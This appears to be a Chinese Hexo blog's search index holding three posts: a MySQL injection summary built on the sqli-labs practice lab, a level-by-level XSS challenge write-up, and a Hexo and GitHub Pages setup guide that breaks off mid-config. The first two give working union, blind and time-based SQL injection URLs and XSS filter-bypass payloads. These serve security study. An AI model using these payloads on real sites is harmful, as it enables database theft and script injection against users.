<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>基于注入天书的mysql注入总结</title>
      <link href="/2019/03/10/%E5%9F%BA%E4%BA%8E%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6%E7%9A%84mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2019/03/10/%E5%9F%BA%E4%BA%8E%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6%E7%9A%84mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/03/10/5c84cc486773d.jpg" alt="1.jpg"></p><p>本篇基于注入天书的例子进行总结</p><p>前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。</p><a id="more"></a><h2 id="基本的联合注入"><a href="#基本的联合注入" class="headerlink" title="基本的联合注入"></a>基本的联合注入</h2><p>information_schema这张数据表保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p><p>再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema表里面。</p><p>这里拿sqli第一关来进行实验</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure><p>我们看一下源码里的查询语句 前面单引号我们应该闭合 后面我们可以用–+来注释<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=1%27order%20by%203--+</span><br></pre></td></tr></table></figure></p><p>接下里思路就比较常规了</p><h3 id="查询所有数据库"><a href="#查询所有数据库" class="headerlink" title="查询所有数据库"></a>查询所有数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+</span><br></pre></td></tr></table></figure><h3 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),3--+</span><br></pre></td></tr></table></figure><h3 id="查询数据库下的表名"><a href="#查询数据库下的表名" class="headerlink" title="查询数据库下的表名"></a>查询数据库下的表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%22security%22--+</span><br></pre></td></tr></table></figure><h3 id="爆user表下的列"><a href="#爆user表下的列" class="headerlink" title="爆user表下的列"></a>爆user表下的列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=%22security%22%20and%20table_name=%22users%22--+</span><br></pre></td></tr></table></figure><h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less-1/?id=-1%27%20union%20select%201,group_concat(id,username,password),3%20from%20users--+</span><br></pre></td></tr></table></figure><p>Less 1-4都是可以用类似的payload来注出数据的</p><p>唯一不同的是 </p><p>less2对没有对参数进行处理payload 与 less1 中一直，只需要将 less1 中的 ‘ 去掉即可。</p><p>less3对参数进行了’ ‘ （ ）的包装 只需要将 less1 中的 ‘ 添加） 即 ’) 即可</p><p>less4对参数进行了” “（ ）的包装 只需要将 less1 中的 ‘ 改为  “) 即可</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注是在sql语句执行后 数据不能返回到前端页面 不能回显</p><p>此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><p>注入天书上讲盲注也分为三类</p><ul><li>基于布尔的sql盲注</li><li>基于时间的sql盲注</li><li>基于报错的sql盲注</li></ul><h3 id="截取字符串常用函数"><a href="#截取字符串常用函数" class="headerlink" title="截取字符串常用函数"></a>截取字符串常用函数</h3><p>count() 计算总数</p><p>mid(coulumn_name,start,length)</p><p>​    mid(database(),1,1)&gt;’a’,查看数据库名第一位，</p><p>​    mid(database(),2,1)查看数据库名第二位，依次查看各位字符。</p><p>Substr(a,b,c)参数同mid函数一样</p><p>​    从 b 位置开始，截取字符串 a 的 c 长度。</p><p>​    substr(database()1,1)</p><p>Left()得到字符串左部指定个数的字符</p><p>​    Left ( a, b )        从左侧截取a的前b位。</p><p>​    left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库    名前二位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema</span><br><span class="line">=database()limit 0,1),1,1))=101 --+ //substr()函数，ascii()函数</span><br></pre></td></tr></table></figure><p>截取当前数据库下所有表名的 第一个表的 名字的第一位是否为ascii编码101(ascii编码101为字母e 也就是第一位是否为e)</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>sqli第五关来做实例</p><p>与联合查询有所不同联合查询上来就可以database爆出数据库名</p><p>盲注的话我们应该先猜数据库长度</p><h4 id="数据库的长度"><a href="#数据库的长度" class="headerlink" title="数据库的长度"></a>数据库的长度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20length(database())=8--+</span><br></pre></td></tr></table></figure><p>上面长度为8时界面Ture说明数据库长度为8</p><p>有了长度以后才应该去猜数据库名</p><h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><p>判断数据库名的第一位是否等于s(这里把s进行了ascii码转换可以更快且更方便的猜出数据)</p><p>以此类推来猜测数据库名第二位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr(database(),2,1))=101--+</span><br></pre></td></tr></table></figure><p>感觉太磨叽 额。。。依次类推猜出数据库名为<code>security</code></p><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p>获取表名之前 首先应该知道数据库下表的数量 方便后面来猜表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20count(table_name)from%20information_schema.tables%20where%20table_schema=database())=4--+</span><br></pre></td></tr></table></figure><p>当前数据库下的表的个数有4个</p><p>步骤应该很清晰</p><p>知道了有4个表接下来 我们来猜一下每个表的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(table_name)from%20information_schema.tables%20where%20table_schema=database()limit%200,1)=6--+</span><br></pre></td></tr></table></figure><p>等于6时返回正常可知第一个表长度为6</p><p>这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那<br>要获取第二个是不是就是 limit 1,1！</p><p>所以获取第二个表的长度为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(table_name)from%20information_schema.tables%20where%20table_schema=database()limit%201,1)=8--+</span><br></pre></td></tr></table></figure><p>第三个，四个类似</p><p>至此可以获取四个表每个表的长度</p><p>接下来猜第一个表名的第一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%200,1),1,1))=101--+</span><br></pre></td></tr></table></figure><p>第一个表第二个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%200,1),2,1))=109--+</span><br></pre></td></tr></table></figure><p>上面提到了<code>limit</code> 所以猜测第二个表的第一个字符的话</p><p><code>limit 1,1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()limit%201,1),1,1))=114--+</span><br></pre></td></tr></table></figure><p>后面依次类推</p><p>到这里我们就获取到了<code>security</code>数据库下 也就是当前数据库下的所有表名</p><p><img src="https://i.loli.net/2019/03/11/5c864d60e0dd5.png" alt="屏幕快照 2019-03-11 下午7.58.11.png"></p><h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p>来看users表下的列</p><p>首先还是和表类似猜测users表下列的个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20count(column_name)from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%22users%22)=3--+</span><br></pre></td></tr></table></figure><p>等于3返回正常判断出有三列</p><p>套路是一样的还是判断</p><p>第一个列的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1%27and%20(select%20length(column_name)from%20information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit%200,1)=2--+</span><br></pre></td></tr></table></figure><p>第二个三个同上面表明一样 <code>limit 1,1</code> <code>limit 2,1</code>即可</p><p>第一个列的第一个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1),1,1))=105--+</span><br></pre></td></tr></table></figure><p>后面就不多写了 都是一样的东西（懒得写）</p><p>后可得 <code>users</code>表下的列</p><ul><li>id</li><li>username</li><li>password</li></ul><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p>得到列首先判断users表中有多少条记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and (select count(*) from users)=13--+</span><br></pre></td></tr></table></figure><p>判断出users表里13条数据信息</p><p>下图 是users表下的内容 </p><p>对比笔记看起来更直观吧</p><p><img src="https://i.loli.net/2019/03/11/5c8648ace9cdf.png" alt="屏幕快照 2019-03-11 下午7.37.59.png"></p><p>紧着着判断 13条数据第一条数据的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and (select length(username) from users limit 0,1)=4 --+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and (select length(password) from users limit 0,1)=4 --+</span><br></pre></td></tr></table></figure><p>后面还是依次类推</p><p>这样就获取到了13条数据的长度</p><p>累死了。。。。</p><p>最后就是猜数据里的内容了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and ascii(substr((select username from users limit 0,1),1,1))=68 --+</span><br></pre></td></tr></table></figure><p>第一条username列下的数据</p><p>不说了还是重复造轮子 到这里就能猜出了</p><p>13条数据的所有内容喽。。。</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>延时注入 和布尔注入感觉差别并不大 但是为什么还要学 延时注入</p><p>这是因为某些注入点 你输入什么它返回的都是一样的东西 和程序员写的源码有关</p><p>这时候布尔注入算是废了 转用延时注入 语法上差别是不大的 </p><p>if(条件判断,True,False)</p><p>Sleep(5)表示延时五秒</p><p>当前数据库长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and sleep(if(length(database())=8,0,5))--+</span><br></pre></td></tr></table></figure><p>这里没有延时 可以确定当前数据库长度为8</p><p>数据库的第一位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1&apos;and sleep(if(ascii(substr(database(),1,1))=115,0,5))--+</span><br></pre></td></tr></table></figure><p>感觉和布尔的区别 就是加上了sleep if</p><p>后面的话就不重复造轮子了 同理！！！</p><p><img src="https://i.loli.net/2019/03/13/5c88d78808b5a.gif" alt="8B753C84DCF432C1F37BA72A650E89B2.gif"></p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xss tv wp</title>
      <link href="/2019/03/01/xss%20tv%20wp/"/>
      <url>/2019/03/01/xss%20tv%20wp/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/03/01/5c788cffc8278.png" alt="屏幕快照 2019-03-01 上午9.37.43.png"></p><p>xss题目 一共20题 难度也在递增吧  写一部分自己的解题过程</p><p>后面题目厉害了 慢慢更新(太菜不会做)</p><p>题目 payload不唯一呦</p><a id="more"></a><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>没有任何过滤</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>记得以前xss这里曾请教过国光哥一些姿势</p><p>先输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure><p>查看源码发现 value的值里使用了双引号 所以想到闭合前面的双引号。</p><p><img src="https://i.loli.net/2019/03/01/5c788f690d578.png" alt="屏幕快照 2019-03-01 上午9.47.12.png"></p><h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure><h3 id="涉及基础"><a href="#涉及基础" class="headerlink" title="涉及基础"></a>涉及基础</h3><p>img为图片标签 src应该填写图片地址 如果图片地址不存在 就会触发onerror事件弹出xss</p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>试探性输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure><p>查看源代码发现两端括号被实体化了 换个姿势</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=alert(1)</span><br></pre></td></tr></table></figure><p>右键源代码 发现本身并没有被过滤 但是value里面使用了单引号 闭合就好</p><h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‘&gt;onclick=&apos;alert(1)</span><br></pre></td></tr></table></figure><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>与level3类似</p><p>这题目value里面使用了双引号 闭合双引号就ok</p><h3 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>参考前面 直接输入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=alert(1)</span><br></pre></td></tr></table></figure><p>发现被过滤 大小写无法绕过 换个姿势</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure><p>这时候查看源代码发现本身并没有过滤 都是一个套路闭合一下双引号即可</p><h3 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>这题目前有点坑 与上题相似 单过滤了href src等属性 </p><p>这里考虑到可以用大小写绕过 </p><h3 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img SRC=1 ONERROR=alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>随便写个payload </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=alert(1)</span><br></pre></td></tr></table></figure><p>查看源代码发现 value有双引号 首先考虑到闭合</p><p>其次on被过滤为空 估计不会进行二次过滤</p><h3 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>添加超链接到页面 本身在a标签里面所以我们payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Javascript:alert(1)</span><br></pre></td></tr></table></figure><p>发现并没弹窗 查看源代码发现javascript被过滤 试了很多都被过滤</p><p>想到html有字解码机制 试一下将过滤关键字实体化</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">字符实体转换</a></p><h3 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(1)</span><br></pre></td></tr></table></figure><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>这里始终不知道是怎么回事 看了xz的wp 得知这题自动检测url 如果发现没有带 http:// 则会显示不合法</p><p>还发现了过滤了双引号 还是利用html自解码机制将关键字实例化即可绕过</p><h3 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;cript:alert(&amp;#34;http://&amp;#34;)</span><br></pre></td></tr></table></figure><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>这题刚打开是懵逼的 </p><p>然后又请教了国光哥<img src="https://i.loli.net/2019/03/01/5c791e45cb43a.gif" alt="7AFA3AE488BF6843C3F551094D258D15.gif"></p><p>右键查看源文件 发现了三个隐藏参数 经过一个个试。</p><p>发现t_sort参数是控的 由于<code>type=&quot;hidden&quot;</code>是隐藏的</p><p>on事件无效</p><p>所以应破坏掉type的hidden 之后利用 onclick 弹窗</p><h3 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=1&amp;t_sort=233%22%20onclick=alert(233)%20type=%22%22</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hexo搭建静态博客</title>
      <link href="/2019/02/19/Hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/02/19/Hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/02/19/5c6bee20be638.jpg" alt="u=3010013829,2497003625&amp;fm=26&amp;gp=0.jpg"></p><p>最新折腾了一下黑苹果 刚刚把博客迁移过来 所以才想起写这篇文章 Hexo+GitHub搭建静态博客 </p><a id="more"></a><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>Node.js下载链接：<br><a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a></p><p>Git下载链接：<br><a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a></p><p>安装好Node.js与Git 接下来安装Hexo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装完成以后</p><p><code>git —version</code>,<code>hexo-v</code>查看安装版本</p><h2 id="本地建站"><a href="#本地建站" class="headerlink" title="本地建站"></a>本地建站</h2><p>我们首先在本地搭建起Blog 等本地都配置完成直接放到GitHub就ok了</p><h3 id="博客框架"><a href="#博客框架" class="headerlink" title="博客框架"></a>博客框架</h3><p>初始化博客框架</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;（博客文件夹名称）</span><br><span class="line">cd &lt;folder&gt;  // 进入博客文件夹目录</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>这时候博客应该会出现如下文件</p><p><img src="https://i.loli.net/2019/02/19/5c6c0956269cd.png" alt="屏幕快照 2019-02-19 下午9.48.41.png"></p><p><strong>_config.yml 是整个站点的配置文件 不要乱改</strong></p><h3 id="写文章进行测试"><a href="#写文章进行测试" class="headerlink" title="写文章进行测试"></a>写文章进行测试</h3><p><code>hexo new 文章名</code></p><p><img src="https://i.loli.net/2019/02/19/5c6c0b6462ed6.png" alt="屏幕快照 2019-02-19 下午9.57.31.png"></p><p>记得在博客目录下 新建文章</p><p>可以看到新建了.md文件在 source/_posts/ 下 记住所有生成的文章都在此目录下</p><p>编辑.md 我用的是typora感觉比较好用 百度下载即可</p><h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">简写 hexo g 就好</span><br></pre></td></tr></table></figure><h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><p>接下来我们访问以下博客 先要启动一下hexo服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br><span class="line">简写 hexo s</span><br></pre></td></tr></table></figure><p>启动以后我们本地访问以下</p><p>默认访问 <a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a></p><p>出现类似界面说明本地测试成功没有任何问题</p><p><img src="https://i.loli.net/2019/02/19/5c6c0de96b70c.png" alt="屏幕快照 2019-02-19 下午10.08.17.png"></p><h3 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h3><p>在博客目录下打开终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>下载完成以后 打开博客目录下的_config.yml</p><p>找到theme 将theme的值改为next</p><p><img src="https://i.loli.net/2019/02/19/5c6c152ea1d97.png" alt="QQ20190219-223900@2x.png"></p><p>之后输入调试命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server --debug</span><br></pre></td></tr></table></figure><p>在访问以下<a href="http://localhost:4000应该就已经更换主题了哦" target="_blank" rel="noopener">http://localhost:4000应该就已经更换主题了哦</a></p><p><img src="https://i.loli.net/2019/02/19/5c6c173f733a9.png" alt="屏幕快照 2019-02-19 下午10.48.10.png"></p><p>感觉排版并不是很舒服 需要改一下 找到主题配置文件</p><p>主题配置文件在博客目录 下的 themes/next/_config.yml</p><p>这里不要搞混 这个是主题配置文件</p><p>搜索 scheme 关键字。</p><p><img src="https://i.loli.net/2019/02/19/5c6c1830cfa70.png" alt="QQ20190219-225208@2x.png"></p><p>前面去掉#号即为启用 我们启用pisces的样式</p><p>这之后样式看起来和我博客类似了 </p><p>主题就先说到这 添加分类 标签 友联 界面语言等 自己Goolge吧</p><p>也可以参考 <a href="http://theme-next.iissnan.com/getting-started.html#avatar-setting" target="_blank" rel="noopener">http://theme-next.iissnan.com/getting-started.html#avatar-setting</a></p><h2 id="部署到GitHub"><a href="#部署到GitHub" class="headerlink" title="部署到GitHub"></a>部署到GitHub</h2><h3 id="注册GitHub账号"><a href="#注册GitHub账号" class="headerlink" title="注册GitHub账号"></a>注册GitHub账号</h3><p>这里自己注册一个账号就好了</p><h3 id="建立新的存储库"><a href="#建立新的存储库" class="headerlink" title="建立新的存储库"></a>建立新的存储库</h3><p>根据GitHub用户名建立的存储库 如我的用户名scholar10所以存储库的名为<code>scholar10.github.io</code></p><h3 id="设置本地GitHub"><a href="#设置本地GitHub" class="headerlink" title="设置本地GitHub"></a>设置本地GitHub</h3><p>填写 git邮箱 用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name  &quot;user_name&quot;</span><br><span class="line">git config --global user.email &quot;your_email_addr&quot;</span><br></pre></td></tr></table></figure><p>第一个填你github的用户名 第二天填写 注册github的邮箱</p><h3 id="本地创建SSH"><a href="#本地创建SSH" class="headerlink" title="本地创建SSH"></a>本地创建SSH</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;1773256697@qq.com&quot;</span><br></pre></td></tr></table></figure><p>填自己注册github的邮箱地址就好</p><p>一路回车就好</p><h3 id="生成的SSH添加到GitHub"><a href="#生成的SSH添加到GitHub" class="headerlink" title="生成的SSH添加到GitHub"></a>生成的SSH添加到GitHub</h3><p>创建完成以后打开用户的根目录 一般在C:\Users\username(你的用户名)</p><p>应该会有.ssh文件夹 这时候找到.ssh文件里面的ssh.pub(公钥)</p><p>将里面的内容全部复制到</p><p><img src="https://i.loli.net/2019/02/20/5c6cc6ceaacc6.png" alt="屏幕快照 2019-02-20 上午11.16.12.png"></p><p><img src="https://i.loli.net/2019/02/20/5c6cc79bb66ad.png" alt="屏幕快照 2019-02-20 上午11.20.15.png"></p><p>点击 new ssh key 会出现 title框和key框 把 ssh.pub内容全部复制到 key框 title 随意写一个名字就好</p><p>验证SSH是否设置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>首次提示不能连接输入yes即可</p><p>接下来打开 博客目录下的_config.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">repo: 